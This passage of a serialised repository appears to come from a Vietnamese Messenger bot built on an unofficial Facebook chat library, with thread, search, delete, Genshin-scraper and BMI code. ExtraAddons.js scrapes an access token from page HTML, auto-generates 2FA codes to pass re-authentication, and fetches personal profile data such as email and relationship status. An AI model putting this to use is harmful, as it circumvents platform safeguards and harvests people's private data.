Object.keys(a)[0].localeCompare(Object.keys(b)[0]); });\n          resData.map(function (x,y) {\n            ThreadInfo.push(formatThreadGraphQLResponse(x[\"o\"+y].data));\n          });\n            try {\n            if (Object.keys(resData).length == 1) {\n              updateData(threadID,ThreadInfo[0]);\t\n              if (utils.getType(ThreadInfo[0].userInfo) == \"Array\") {\n                for (let i of ThreadInfo[0].userInfo) {\n                  if (global.Fca.Data.Userinfo.some(ii => ii.id == i.id)) {\n                    global.Fca.Data.Userinfo.splice(global.Fca.Data.Userinfo.findIndex(ii => ii.id == i.id), 1);\n                  }\n                  global.Fca.Data.Userinfo.push(i);\n                }\n              }\n            } else {\n              for (let i of ThreadInfo) {\n                updateData(i.threadID,i);\n                if (utils.getType(i.userInfo) == \"Array\") {\n                  for (let ii of i.userInfo) {\n                    if (global.Fca.Data.Userinfo.some(iii => iii.id == ii.id)) {\n                      global.Fca.Data.Userinfo.splice(global.Fca.Data.Userinfo.findIndex(iii => iii.id == ii.id), 1);\n                    }\n                    global.Fca.Data.Userinfo.push(ii);\n                  }\n                }\n              }\n            }\n          }\n        catch (e) {\n          console.log(e);\n        }\n        })\n        .catch(function(err){\n          throw \"L·ªói: getThreadInfoGraphQL C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu\";\n        });\n      }\n    };\n\n    var DefaultMethod = function(TID) { \n      var ThreadInfo = [];\n      for (let i of TID) {\n        ThreadInfo.push(getData(i));\n      }\n      if (ThreadInfo.length == 1) {\n        callback(null,ThreadInfo[0]);\n        if (utils.getType(ThreadInfo[0].userInfo) == \"Array\") {\n          for (let i of ThreadInfo[0].userInfo) {\n            if (global.Fca.Data.Userinfo.some(ii => ii.id == i.id)) {\n              global.Fca.Data.Userinfo.splice(global.Fca.Data.Userinfo.findIndex(ii => ii.id == i.id), 1);\n            }\n            global.Fca.Data.Userinfo.push(i);\n          }\n      } else {\n        for (let i of ThreadInfo) {\n          if (utils.getType(i.userInfo) == \"Array\") {\n            for (let ii of i.userInfo) {\n              if (global.Fca.Data.Userinfo.some(iii => iii.id == ii.id)) {\n                global.Fca.Data.Userinfo.splice(global.Fca.Data.Userinfo.findIndex(iii => iii.id == ii.id), 1);\n              }\n              global.Fca.Data.Userinfo.push(ii);\n            }\n          }\n        }\n        callback(null,ThreadInfo);\n      }\n    }\n  };\n    var CreateMethod = function(TID) { \n      var Form = {};\n      var ThreadInfo = [];\n\n      TID.map(function (x,y) {\n        Form[\"o\" + y] = {\n          doc_id: \"3449967031715030\",\n          query_params: {\n            id: x,\n            message_limit: 0,\n            load_messages: false,\n            load_read_receipts: false,\n            before: null\n          }\n        };\n      });\n\n      var form = {\n        queries: JSON.stringify(Form),\n        batch_name: \"MessengerGraphQLThreadFetcher\"\n      };\n      defaultFuncs\n      .post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, form)\n        .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n        .then(function(resData) {\n        if (resData.error) {\n          throw resData.error;\n        }\n        if (resData[resData.length - 1].error_results !== 0) {\n          throw resData.error;\n        }\n        resData = resData.splice(0, resData.length - 1);\n        resData.sort((a, b) => { return Object.keys(a)[0].localeCompare(Object.keys(b)[0]); });\n        resData.map(function (x,y) {\n          ThreadInfo.push(formatThreadGraphQLResponse(x[\"o\"+y].data));\n        });\n        if (Object.keys(resData).length == 1) {\n          createData(threadID,ThreadInfo[0]);\t\n          callback(null, ThreadInfo[0]);\n          capture(callback);\n          setLastRun('LastUpdate', callback);\n          if (global.Fca.Data.Userinfo == undefined) global.Fca.Data.Userinfo = [];\n          if (utils.getType(ThreadInfo[0].userInfo) == \"Array\") {\n            for (let i of ThreadInfo[0].userInfo) {\n              if (global.Fca.Data.Userinfo.some(ii => ii.id == i.id)) {\n                global.Fca.Data.Userinfo.splice(global.Fca.Data.Userinfo.findIndex(ii => ii.id == i.id), 1);\n              }\n              global.Fca.Data.Userinfo.push(i);\n            }\n          }\n        } else {\n          // api.Horizon_Data([ThreadInfo], \"Threads\", \"Post\");\n          for (let i of ThreadInfo) {\n            createData(i.threadID,i);\n            if (utils.getType(i.userInfo) == \"Array\") {\n              for (let ii of i.userInfo) {\n                if (global.Fca.Data.Userinfo.some(iii => iii.id == ii.id)) {\n                  global.Fca.Data.Userinfo.splice(global.Fca.Data.Userinfo.findIndex(iii => iii.id == ii.id), 1);\n                }\n                global.Fca.Data.Userinfo.push(ii);\n              }\n            }\n          }\n          callback(null, ThreadInfo);\n        }\n      })\n      .catch(function(err){\n        throw err;\n      });\n    };\n    if (global.Fca.Data.Already != true) { SpecialMethod(threadID); global.Fca.Data.Already = true; setInterval(function(){Database(true).set('UserInfo', global.Fca.Data.Userinfo); delete global.Fca.Data.Userinfo; global.Fca.Data.Userinfo = []; }, 900 * 1000); } \n    \n    try {\n      for (let i of threadID) {\n        switch (hasData(i)) {\n            case true: {     \n              DefaultMethod(threadID);\n              break;\n            }\n          case false: {\n            CreateMethod(threadID);\n            break;\n          }\n        }\n      }\n    }\n    catch (err) {\n      console.log(err);\n    }\n    return returnPromise;\n  };\n};","path":null,"size_bytes":15115,"size_tokens":null},"lib/fca-auto/src/searchForThread.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function searchForThread(name, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n        resolveFunc(data);\n      };\n    }\n\n    var tmpForm = {\n      client: \"web_messenger\",\n      query: name,\n      offset: 0,\n      limit: 21,\n      index: \"fbid\"\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/ajax/mercury/search_threads.php\", ctx.jar, tmpForm)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) throw resData;\n        if (!resData.payload.mercury_payload.threads) return callback({ error: \"Could not find thread `\" + name + \"`.\" });\n        return callback(\n          null,\n          resData.payload.mercury_payload.threads.map(utils.formatThread)\n        );\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1171,"size_tokens":null},"lib/fca-auto/Extra/Security/Base/Step_3.js":{"content":"'use strict';\n\nconst crypto = require('crypto');\nconst aes = require(\"aes-js\");\n\nmodule.exports.encryptState = function encryptState(data, key) {\n    let hashEngine = crypto.createHash(\"sha256\");\n    let hashKey = hashEngine.update(key).digest();\n    let bytes = aes.utils.utf8.toBytes(data);\n    let aesCtr = new aes.ModeOfOperation.ctr(hashKey);\n    let encryptedData = aesCtr.encrypt(bytes);\n    return aes.utils.hex.fromBytes(encryptedData);\n};\n\nmodule.exports.decryptState = function decryptState(data, key) {\n    let hashEngine = crypto.createHash(\"sha256\");\n    let hashKey = hashEngine.update(key).digest();\n    let encryptedBytes = aes.utils.hex.toBytes(data);\n    let aesCtr = new aes.ModeOfOperation.ctr(hashKey);\n    let decryptedData = aesCtr.decrypt(encryptedBytes);\n    return aes.utils.utf8.fromBytes(decryptedData);\n};\n","path":null,"size_bytes":836,"size_tokens":null},"includes/database/model.js":{"content":"module.exports = function (input) {\r\n\tconst force = false;\r\n\r\n\tconst Users = require(\"./models/users\")(input);\r\n\tconst Threads = require(\"./models/threads\")(input);\r\n\tconst Currencies = require(\"./models/currencies\")(input);\r\n\r\n\tUsers.sync({ force });\r\n\tThreads.sync({ force });\r\n\tCurrencies.sync({ force });\r\n\r\n\treturn {\r\n\t\tmodel: {\r\n\t\t\tUsers,\r\n\t\t\tThreads,\r\n\t\t\tCurrencies,\r\n\t\t},\r\n\t\tuse: function (modelName) {\r\n\t\t\treturn this.model[`${modelName}`];\r\n\t\t}\r\n\t}\r\n}","path":null,"size_bytes":461,"size_tokens":null},"modules/commands/genshin.js":{"content":"const axios = require('axios');\nconst cheerio = require('cheerio');\n\nmodule.exports.config = {\n    name: \"genshin\",\n    version: \"1.1.0\",\n    hasPermssion: 3,\n    credits: \"TatsuYTB\",\n    description: \"Fetch information about a Genshin Impact character or weapon\",\n    commandCategory: \"H·ªá Th·ªëng\",\n    usages: \"[character/weapon] [name]\",\n    cooldowns: 5,\n    handleReaction: true\n};\n\nmodule.exports.languages = {\n    \"vi\": {\n        \"fetching\": \"ƒêang l·∫•y th√¥ng tin v·ªÅ %1 %2...\",\n        \"notFound\": \"Kh√¥ng t√¨m th·∫•y th√¥ng tin v·ªÅ %1 %2.\",\n        \"characterInfo\": \"T√™n: %1\\nNguy√™n t·ªë: %2\\nQu·ªëc gia: %3\\nNh√¢n v·∫≠t: %7\\nNg√†y sinh nh·∫≠t: %4\\nNg√†y ra m·∫Øt: %5\\nƒê√£ ra m·∫Øt ƒë∆∞·ª£c: %6\",\n        \"weaponInfo\": \"T√™n: %1\\nLo·∫°i: %2\\nƒê·ªô hi·∫øm: %3 ‚òÖ\\nT·∫•n C√¥ng CƒÉn B·∫£n: %5\\n%6: %7 %\\nTinh Luy·ªán: %8\\nM√¥ t·∫£: %4\",\n        \"suggestions\": \"B·∫°n c√≥ √Ω ƒë·ªãnh t√¨m: %1?\"\n    },\n    \"en\": {\n        \"fetching\": \"Fetching information about %1 %2...\",\n        \"notFound\": \"Information about %1 %2 not found.\",\n        \"characterInfo\": \"Name: %1\\nElement: %2\\nNation: %3\\nBirthday: %4\\nRelease Date: %5\\nReleased: %6\\nStars: %7\",\n        \"weaponInfo\": \"Name: %1\\nType: %2\\nRarity: %3\\nBasic Attack: %6\\nEffect: %4\\nSubstat: %7\\nDescription: %5\",\n        \"suggestions\": \"Did you mean: %1?\"\n    }\n};\n\nconst elementTranslation = {\n    \"Dendro\": \"Th·∫£o\",\n    \"Pyro\": \"H·ªèa\",\n    \"Hydro\": \"Th·ªßy\",\n    \"Electro\": \"L√¥i\",\n    \"Anemo\": \"Phong\",\n    \"Cryo\": \"BƒÉng\",\n    \"Geo\": \"Nham\"\n};\n\nconst translateElement = (element) => {\n    return elementTranslation[element] || element;\n};\n\nconst formatDate = (dateString) => {\n    const months = {\n        \"January\": 1, \"February\": 2, \"March\": 3, \"April\": 4, \"May\": 5, \"June\": 6,\n        \"July\": 7, \"August\": 8, \"September\": 9, \"October\": 10, \"November\": 11, \"December\": 12\n    };\n    const [month, day, year] = dateString.split(' ');\n    return `${parseInt(day)}/${months[month]}/${year}`;\n};\n\nconst formatBirthday = (birthday) => {\n    const months = {\n        \"January\": 1, \"February\": 2, \"March\": 3, \"April\": 4, \"May\": 5, \"June\": 6,\n        \"July\": 7, \"August\": 8, \"September\": 9, \"October\": 10, \"November\": 11, \"December\": 12\n    };\n    const [month, day] = birthday.split(' ');\n    return `${parseInt(day)}/${months[month]}`;\n};\n\nconst translateReleasedTime = (releasedTime) => {\n    let time = releasedTime.replace('years', 'nƒÉm').replace('year', 'nƒÉm').replace('months', 'th√°ng').replace('month', 'th√°ng').replace('ago', 'tr∆∞·ªõc');\n    return time;\n};\n\nconst modifyCharacterName = (characterName) => {\n    return characterName.split(' ')\n                        .map(word => word.charAt(0).toUpperCase() + word.slice(1).toLowerCase())\n                        .join('_');\n};\n\nconst modifyWeaponName = (weaponName) => {\n    return weaponName.split(' ').join('_');\n};\n\nconst knownCharacters = [\n    // List of known characters\n];\n\nconst knownWeapons = [\n    // List of known weapons\n];\n\nconst levenshteinDistance = (a, b) => {\n    const matrix = [];\n\n    for (let i = 0; i <= b.length; i++) {\n        matrix[i] = [i];\n    }\n\n    for (let j = 0; j <= a.length; j++) {\n        matrix[0][j] = j;\n    }\n\n    for (let i = 1; i <= b.length; i++) {\n        for (let j = 1; j <= a.length; j++) {\n            if (b.charAt(i - 1) === a.charAt(j - 1)) {\n                matrix[i][j] = matrix[i - 1][j - 1];\n            } else {\n                matrix[i][j] = Math.min(\n                    matrix[i - 1][j - 1] + 1, // substitution\n                    matrix[i][j - 1] + 1, // insertion\n                    matrix[i - 1][j] + 1 // deletion\n                );\n            }\n        }\n    }\n\n    return matrix[b.length][a.length];\n};\n\nconst getClosestMatches = (input, list, maxDistance = 3) => {\n    const distances = list.map(name => ({\n        name,\n        distance: levenshteinDistance(input.toLowerCase(), name.toLowerCase())\n    }));\n\n    distances.sort((a, b) => a.distance - b.distance);\n\n    return distances.filter(item => item.distance <= maxDistance).map(item => item.name);\n};\n\nconst fetchCharacterInfo = async (characterName) => {\n    const modifiedName = modifyCharacterName(characterName);\n    const url = `https://genshin-impact.fandom.com/wiki/${encodeURIComponent(modifiedName)}`;\n\n    try {\n        const { data } = await axios.get(url);\n        const $ = cheerio.load(data);\n\n        const name = $('h1.page-header__title').text().trim();\n        if (!name) {\n            const suggestions = getClosestMatches(characterName, knownCharacters);\n            return { suggestions };\n        }\n\n        const element = $('td[data-source=\"element\"] a').attr('title').trim();\n        const translatedElement = translateElement(element);\n        const nation = $('div[data-source=\"region\"] > div').text().trim();\n        const birthday = $('div[data-source=\"birthday\"] > div').text().trim();\n        const formattedBirthday = formatBirthday(birthday);\n\n        const releaseDateElement = $('div[data-source=\"releaseDate\"] > div.pi-data-value').html().split('<br>');\n        const releaseDate = releaseDateElement[0].trim();\n        const formattedReleaseDate = formatDate(releaseDate);\n        const releasedTime = releaseDateElement[1].trim();\n        const translatedReleasedTime = translateReleasedTime(releasedTime);\n\n        const starsElement = $('td[data-source=\"quality\"] img').attr('title').trim();\n        const stars = starsElement ? starsElement.replace('Stars', 'Sao') : \"Unknown\";\n\n        return { name, element: translatedElement, nation, birthday: formattedBirthday, releaseDate: formattedReleaseDate, releasedTime: translatedReleasedTime, stars };\n    } catch (error) {\n        console.error(\"Error fetching character info:\", error);\n        const suggestions = getClosestMatches(characterName, knownCharacters);\n        return { suggestions };\n    }\n};\n\nconst fetchWeaponInfo = async (weaponName) => {\n    const modifiedName = modifyWeaponName(weaponName);\n    const url = `https://genshin-builds.com/vi/weapon/${encodeURIComponent(modifiedName)}`;\n\n    try {\n        const { data } = await axios.get(url);\n        const $ = cheerio.load(data);\n\n        const nameStarsElement = $('h1.mr-2.text-3xl.text-white').text().trim();\n        const nameMatch = nameStarsElement.match(/(.*)\\s\\((\\d)‚òÖ\\)/);\n        if (!nameMatch) {\n            const suggestions = getClosestMatches(weaponName, knownWeapons);\n            return { suggestions };\n        }\n\n        const name = nameMatch[1].trim();\n        const stars = nameMatch[2].trim();\n\n        const type = $('ul li:contains(\"Lo·∫°i:\")').text().replace('Lo·∫°i: ', '').trim();\n        const substat = $('ul li:contains(\"Th·ª© hai:\")').text().replace('Th·ª© hai: ', '').trim();\n        const description = $('div.flex.flex-grow.flex-col > div:last-child').text().trim();\n\n        const basicAttackElement = $('div.text-xl:contains(\"T·∫•n C√¥ng CƒÉn B·∫£n\")').text().trim();\n        const basicAttack = basicAttackElement.replace('T·∫•n C√¥ng CƒÉn B·∫£n: ', '').trim();\n\n        let critRate = null;\n        const critRateLabels = [\"ST B·∫°o K√≠ch\", \"HP\", \"Hi·ªáu Qu·∫£ N·∫°p Nguy√™n T·ªë\", \"T·ªâ L·ªá B·∫°o K√≠ch\"];\n\n        for (let i = 0; i < critRateLabels.length; i++) {\n            const critRateLabel = critRateLabels[i];\n            const elements = $(`div.text-xl:contains(\"${critRateLabel}\")`);\n\n            elements.each((index, element) => {\n                const text = $(element).text().trim();\n                if (text.includes(critRateLabel)) {\n                    critRate = critRate || {};\n                    const critRateValue = text.replace(`${critRateLabel}: `, '').trim().match(/\\d+/)[0];\n                    critRate = critRateValue;\n                    return false;\n                }\n            });\n\n            if (critRate) {\n                break;\n            }\n        }\n\n        const refinement = $('div.mb-8 h2:contains(\"Tinh luy·ªán\")').next('div.card').text().trim();\n\n        console.log(\"Fetched weapon info:\", { name, type, stars, description, basicAttack, substat, critRate, refinement });\n\n        return { name, type, stars, description, basicAttack, substat, critRate, refinement };\n    } catch (error) {\n        console.error(\"Error fetching weapon info:\", error);\n        const suggestions = getClosestMatches(weaponName, knownWeapons);\n        return { suggestions };\n    }\n};\n\nconst fetchMaxLevelWeaponInfo = async (weaponName) => {\n    const modifiedName = modifyWeaponName(weaponName);\n    const url = `https://genshin-builds.com/vi/weapon/${encodeURIComponent(modifiedName)}`;\n\n    try {\n        const { data } = await axios.get(url);\n        const $ = cheerio.load(data);\n\n        const buttonSelector = 'button.mx-2.my-1.rounded.border.p-1.px-4.border-gray-700.bg-vulcan-700.text-white.hover\\\\:bg-vulcan-600';\n        const buttonRefinementSelector = 'button.mx-2.my-1.rounded.border.p-1.px-4.border-gray-800.bg-vulcan-800';\n\n        for (let i = 0; i < 1; i++) {\n            $(buttonSelector).click();\n        }\n\n        const maxLevelInfo = $('div.card:contains(\"C·∫•p ƒë·ªô: 90\")').html();\n        const $maxLevel = cheerio.load(maxLevelInfo);\n\n        const basicAttack = $maxLevel('div.text-xl:contains(\"T·∫•n C√¥ng CƒÉn B·∫£n\")').text().replace('T·∫•n C√¥ng CƒÉn B·∫£n: ', '').trim();\n        const critRate = $maxLevel('div.text-xl:contains(\"ST B·∫°o K√≠ch\")').text().replace('ST B·∫°o K√≠ch: ', '').trim();\n\n        for (let i = 0; i < 4; i++) {\n            $(buttonRefinementSelector).click();\n        }\n\n        const refinementInfo = $('div.card:contains(\"V·∫øt C·∫Øt S∆∞∆°ng M√π\")').html();\n        const $refinement = cheerio.load(refinementInfo);\n        const refinement = $refinement('div').text().trim();\n\n        console.log(\"Fetched max level weapon info:\", { basicAttack, critRate, refinement });\n\n        return { basicAttack, critRate, refinement };\n    } catch (error) {\n        console.error(\"Error fetching max level weapon info:\", error);\n        return null;\n    }\n};\n\nmodule.exports.handleReaction = async function (o) {\n    const { threadID: t, messageID: m, reaction: r } = o.event;\n\n    console.log(\"Reaction received:\", r);\n\n    if (r !== \"üòº\") return;\n\n    console.log(\"Fetching max level weapon info for:\", o.data.weaponName);\n\n    const maxLevelInfo = await fetchMaxLevelWeaponInfo(o.data.weaponName);\n    if (maxLevelInfo) {\n        const { basicAttack, critRate, refinement } = maxLevelInfo;\n        const maxLevelMessage = `T·∫•n C√¥ng CƒÉn B·∫£n (C·∫•p 90): ${basicAttack}\\nST B·∫°o K√≠ch (C·∫•p 90): ${critRate}\\nTinh Luy·ªán: ${refinement}`;\n        console.log(\"Sending max level weapon info message:\", maxLevelMessage);\n        o.api.sendMessage({ body: maxLevelMessage }, t, m);\n    } else {\n        console.log(\"No max level info found.\");\n    }\n};\n\nconst setReactionListener = async (api) => {\n    if (!api.setMessageReactionListener) {\n        return;\n    }\n\n    api.setMessageReactionListener(module.exports.handleReaction);\n};\n\nmodule.exports = {\n    ...module.exports,\n    onLoad: async function ({ api }) {\n        setReactionListener(api);\n    }\n};\n\nmodule.exports.onLoad = async function ({ api }) {\n    setReactionListener(api);\n};\n\nmodule.exports.run = async ({ api, event, args, getText }) => {\n    if (args.length < 2) {\n        return api.sendMessage(getText(\"usages\"), event.threadID, event.messageID);\n    }\n\n    const type = args[0].toLowerCase();\n    const name = args.slice(1).join(\" \");\n    if (!name) {\n        return api.sendMessage(getText(\"usages\"), event.threadID, event.messageID);\n    }\n\n    api.sendMessage(getText(\"fetching\", type, name), event.threadID, event.messageID);\n\n    let info;\n    if (type === \"character\") {\n        info = await fetchCharacterInfo(name);\n    } else if (type === \"weapon\") {\n        info = await fetchWeaponInfo(name);\n    } else {\n        return api.sendMessage(getText(\"usages\"), event.threadID, event.messageID);\n    }\n\n    if (info) {\n        if (info.suggestions) {\n            const suggestions = info.suggestions.join(\", \");\n            return api.sendMessage(getText(\"suggestions\", suggestions), event.threadID, event.messageID);\n        }\n\n        if (type === \"character\") {\n            const { name, element, nation, birthday, releaseDate, releasedTime, stars } = info;\n            const message = getText(\"characterInfo\", name, element, nation, birthday, releaseDate, releasedTime, stars);\n            api.sendMessage(message, event.threadID, event.messageID);\n        } else if (type === \"weapon\") {\n            const { name, type, stars, description, basicAttack, substat, critRate, refinement } = info;\n            const message = getText(\"weaponInfo\", name, type, stars, description, basicAttack, substat, critRate, refinement);\n\n            api.sendMessage(message, event.threadID, (error, info) => {\n                if (error) return console.error(error);\n\n                const reactionData = {\n                    threadID: event.threadID,\n                    messageID: info.messageID,\n                    weaponName: name,\n                    api: api\n                };\n\n                module.exports.handleReaction.data = reactionData;\n            });\n        }\n    } else {\n        api.sendMessage(getText(\"notFound\", type, name), event.threadID, event.messageID);\n    }\n};\n","path":null,"size_bytes":13305,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/deleteMessage.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function deleteMessage(messageOrMessages, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n    if (!callback) {\n      callback = function (err) {\n        if (err) return rejectFunc(err);\n\n        resolveFunc();\n      };\n    }\n\n    var form = {\n      client: \"mercury\"\n    };\n\n    if (utils.getType(messageOrMessages) !== \"Array\") messageOrMessages = [messageOrMessages];\n\n    for (var i = 0; i < messageOrMessages.length; i++) form[\"message_ids[\" + i + \"]\"] = messageOrMessages[i];\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/ajax/mercury/delete_messages.php\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) throw resData;\n\n        return callback();\n      })\n      .catch(function (err) {\n        log.error(\"deleteMessage\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1212,"size_tokens":null},"modules/commands/bmi.js":{"content":"module.exports.config = {\n    name: \"bmi\",\n    version: \"1.0.0\",\n    hasPermssion: 0,\n    credits: \"tdong\",\n    description: \"T√≠nh to√°n ch·ªâ s·ªë BMI c·ªßa b·∫°n\",\n    commandCategory: \"Ti·ªán √≠ch\",\n    usages: \"+ ‚Ä∫chi·ªÅu cao‚Äπ + ‚Ä∫c√¢n n·∫∑ng‚Äπ\",\n    cooldowns: 5\n};\n\nmodule.exports.run = async function({ api , event , args , Users }) {\n    const { threadID , messageID , senderID } = event;\n    if (!args[0] || !args[1]) return api.sendMessage('Vui l√≤ng d√πng /bmi + ‚Ä∫chi·ªÅu cao‚Äπ + ‚Ä∫c√¢n n·∫∑ng‚Äπ ƒë·ªÉ t√≠nh ch·ªâ s·ªë BMI c·ªßa b·∫°n!\\nV√≠ d·ª•: /bmi 1.75 77', threadID, messageID);\n    if (isFinite(args[0]) == false) return api.sendMessage('Chi·ªÅu cao kh√¥ng ƒë√∫ng ƒë·ªãnh d·∫°ng!', threadID, messageID);\n    if (isFinite(args[1]) == false) return api.sendMessage('C√¢n n·∫∑ng kh√¥ng ƒë√∫ng ƒë·ªãnh d·∫°ng!', threadID, messageID);\n    var rawHeight = parseFloat(args[0]);\n    var weight = parseFloat(args[1]);\n    if (rawHeight < 0 || weight < 0) return api.sendMessage('V√£i c·∫£ l*z', threadID, messageID);\n    if (rawHeight < 3) {\n        var height = rawHeight;\n    } else if (rawHeight >= 3) {\n        var height = rawHeight / 100;\n    };\n    const name = await Users.getNameUser(senderID);\n    var rawbmi = weight / ( height * height );\n    var bmi = rawbmi.toFixed(2);\n    if (bmi < 15) {\n        var bodyState = 'Thi·∫øu c√¢n r·∫•t n·∫∑ng';\n    } else if (bmi >= 15 && bmi < 16) {\n        var bodyState = 'Thi·∫øu c√¢n n·∫∑ng';\n    } else if (bmi >= 16 && bmi < 18.5) {\n        var bodyState = 'Thi·∫øu c√¢n';\n    } else if (bmi >= 18.5 && bmi < 25) {\n        var bodyState = 'B√¨nh th∆∞·ªùng';\n    } else if (bmi >= 25 && bmi < 30) {\n        var bodyState = 'Ti·ªÅn b√©o ph√¨';\n    } else if (bmi >= 30 && bmi < 35) {\n        var bodyState = 'B√©o ph√¨ ƒë·ªô I';\n    } else if (bmi >= 35 && bmi < 40) {\n        var bodyState = 'B√©o ph√¨ ƒë·ªô II';\n    } else if (bmi >= 40) {\n        var bodyState = 'B√©o ph√¨ ƒë·ªô III';\n    };\n    api.sendMessage(`üë§ T√™n: ${name}\\nüìè Chi·ªÅu cao: ${height} m√©t\\n‚öñÔ∏è C√¢n n·∫∑ng: ${weight} kilograms\\nüß¨ Ch·ªâ s·ªë BMI: ${bmi}\\nüìù T√¨nh tr·∫°ng s·ª©c kho·∫ª: ${bodyState}`, threadID, messageID);\n};","path":null,"size_bytes":2185,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/ExtraAddons.js":{"content":"'use strict';\n\nvar utils = require('../utils');\nvar logger = require('../logger')\nvar OTP = require('totp-generator');\n\nmodule.exports.getInfo = async function (id,jar,ctx,defaultFuncs) {\n    var AccessToken = await module.exports.getAccessToken(jar,ctx,defaultFuncs);\n    var { body:Data } = await utils.get(`https://graph.facebook.com/${id}?fields=age_range,picture,cover,name,first_name,email,about,birthday,gender,website,hometown,link,location,quotes,relationship_status,significant_other,username,subscribers.limite(0)&access_token=${AccessToken}`,jar,null,ctx.globalOptions);\n    var Format = {\n        id: JSON.parse(Data).id || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        name: JSON.parse(Data).name || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        first_name: JSON.parse(Data).first_name || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        username: JSON.parse(Data).username || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        link: JSON.parse(Data).link || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        verified: JSON.parse(Data).verified || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        about: JSON.parse(Data).about || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        avatar: JSON.parse(Data).picture.data.url || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        cover: JSON.parse(Data).cover.source || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        birthday: JSON.parse(Data).birthday || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        age: JSON.parse(Data).age_range.min || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        follow: JSON.parse(Data).subscribers.summary.total_count || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        gender: JSON.parse(Data).gender || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        hometown: JSON.parse(Data).hometown || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        email: JSON.parse(Data).email || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        interested_in: JSON.parse(Data).interested_in || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        location: JSON.parse(Data).location || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        locale: JSON.parse(Data).locale || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        relationship_status: JSON.parse(Data).relationship_status || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        love: JSON.parse(Data).significant_other || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        website: JSON.parse(Data).website || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        quotes: JSON.parse(Data).quotes || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        timezone: JSON.parse(Data).timezone || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\",\n        updated_time: JSON.parse(Data).updated_time || \"Kh√¥ng C√≥ D·ªØ Li·ªáu\"\n    }\n    return Format;\n}\n\n/**\n * Help: @ManhG\n * Author: @KanzuWakazaki\n*/\n\nmodule.exports.getAccessToken = async function (jar, ctx,defaultFuncs) {\n    if (global.Fca.Data.AccessToken) {\n        return global.Fca.Data.AccessToken;\n    }\n    else {\n        var nextURLS = \"https://business.facebook.com/security/twofactor/reauth/enter/\"\n        return defaultFuncs.get('https://business.facebook.com/content_management', jar, null, ctx.globalOptions).then(async function(data) {\n            try {\n                if (/\"],\\[\"(.*?)\",\"/.exec(/LMBootstrapper(.*?){\"__m\":\"LMBootstrapper\"}/.exec(data.body)[1])[1])  {\n                    global.Fca.Data.AccessToken = /\"],\\[\"(.*?)\",\"/.exec(/LMBootstrapper(.*?){\"__m\":\"LMBootstrapper\"}/.exec(data.body)[1])[1];\n                    return /\"],\\[\"(.*?)\",\"/.exec(/LMBootstrapper(.*?){\"__m\":\"LMBootstrapper\"}/.exec(data.body)[1])[1];\n                }\n            }\n            catch (_) {\n                if (global.Fca.Require.FastConfig.AuthString.includes('|')) return logger.Error(global.Fca.Require.Language.Index.Missing)\n                var OPTCODE = global.Fca.Require.FastConfig.AuthString.includes(\" \") ? global.Fca.Require.FastConfig.AuthString.replace(RegExp(\" \", 'g'), \"\") : global.Fca.Require.FastConfig.AuthString;\n                var Form = { \n                    approvals_code: OTP(String(OPTCODE)),\n                    save_device: false,\n                    lsd: utils.getFrom(data.body, \"[\\\"LSD\\\",[],{\\\"token\\\":\\\"\", \"\\\"}\")\n                }\n                return defaultFuncs.post(nextURLS, jar, Form, ctx.globalOptions, { \n                    referer: \"https://business.facebook.com/security/twofactor/reauth/?twofac_next=https%3A%2F%2Fbusiness.facebook.com%2Fcontent_management&type=avoid_bypass&app_id=0&save_device=0\",\n                }).then(async function(dataa) {\n                    if (String(dataa.body).includes(false)) throw { Error: \"Invaild OTP | FastConfigFca.json: AuthString\" }\n                    return utils.get('https://business.facebook.com/content_management', jar, null, ctx.globalOptions,{ \n                        referer: \"https://business.facebook.com/security/twofactor/reauth/?twofac_next=https%3A%2F%2Fbusiness.facebook.com%2Fcontent_management&type=avoid_bypass&app_id=0&save_device=0\",\n                    }).then(async function(data) {\n                        